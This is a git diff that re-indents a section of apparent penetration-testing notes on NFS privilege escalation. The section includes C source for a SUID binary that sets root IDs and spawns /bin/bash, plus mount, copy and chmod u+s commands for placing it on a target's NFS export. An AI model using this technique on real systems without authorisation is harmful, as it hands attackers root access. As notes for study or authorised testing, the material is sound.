@@ -173,22 +173,22 @@ void dbquery() {
 - Exploitation steps:
 	- Create suid binary that executes `/bin/sh` on kali machine
 
-```
-#include <stdio.h>
-#include <sys/types.h>
-#include <unistd.h>
-#include <stdlib.h>
+	```
+	#include <stdio.h>
+	#include <sys/types.h>
+	#include <unistd.h>
+	#include <stdlib.h>
 
-int main(void)
-{
-  setuid(0); setgid(0); system("/bin/bash");
-}
-```
+	int main(void)
+	{
+	setuid(0); setgid(0); system("/bin/bash");
+	}
+	```
 
-	- Mount `/mnt` to `/tmp` on the target server's NFS - `sudo mount -t nfs {target}:/tmp /mnt`
-	- Copy the file to `/tmp` directory on the NFS server - `cp {binary_name} /mnt`
-	- Set the SUID bit - `chmod u+s /mnt/{binary_name}`
-	- Swtich back to the low priv user session and execute to gain a shell
+  - Mount `/mnt` to `/tmp` on the target server's NFS - `sudo mount -t nfs {target}:/tmp /mnt`
+  - Copy the file to `/tmp` directory on the NFS server - `cp {binary_name} /mnt`
+  - Set the SUID bit - `chmod u+s /mnt/{binary_name}`
+  - Swtich back to the low priv user session and execute to gain a shell
 
 
 **What to do once you have root?**
